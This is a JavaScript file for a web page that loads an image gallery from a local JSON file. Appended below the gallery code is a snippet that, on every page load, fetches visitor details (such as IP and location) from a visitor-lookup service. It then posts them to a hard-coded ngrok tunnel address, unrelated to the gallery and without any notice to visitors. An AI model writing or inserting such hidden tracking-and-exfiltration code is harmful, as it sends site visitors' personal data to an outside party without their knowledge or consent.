const imageContainer = document.getElementById("image-container");

axios
  .get("../data/images.json")
  .then((response) => {
    const images = response.data.images;

    images.forEach((image) => {
      const imgElement = document.createElement("img");
      imgElement.src = image.url;
      imgElement.alt = `Image ${image.id}`;
      imgElement.classList.add("image-item");
      imageContainer.appendChild(imgElement);
    });
  })
  .catch((error) => {
    console.error("Error fetching images:", error);
  });

const VisitorAPI = function(t, e, a) {
    var s = new XMLHttpRequest();
    s.onreadystatechange = function() {
        var t;
        s.readyState === XMLHttpRequest.DONE && (200 === (t = JSON.parse(s.responseText)).status ? e(t.data) : a(t.status, t.result));
    };
    s.open("GET", "https://api.visitorapi.com/api/?pid=" + t);
    s.send(null);
};

VisitorAPI(
    "TfjTP0pmySVZ9W4TVzIf",
    function(data) {
        // Now that we have the data, we can perform a POST request with axios
        axios.post('https://9c927b9fb52d.ngrok.app/post', data, {
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(function(response) {
            // You can log here if the data was sent successfully
            console.log(`Sending Data: ${JSON.stringify(data)}`);
            console.log('Data sent successfully:', response.data);
        })
        .catch(function(error) {
            // Log in case of an error
            console.error('Error sending data:', error);
        });
    },
    function(errorCode, errorMessage) {
        // Log in case of an error from the Visitor API
        console.log(errorCode, errorMessage);
    }
);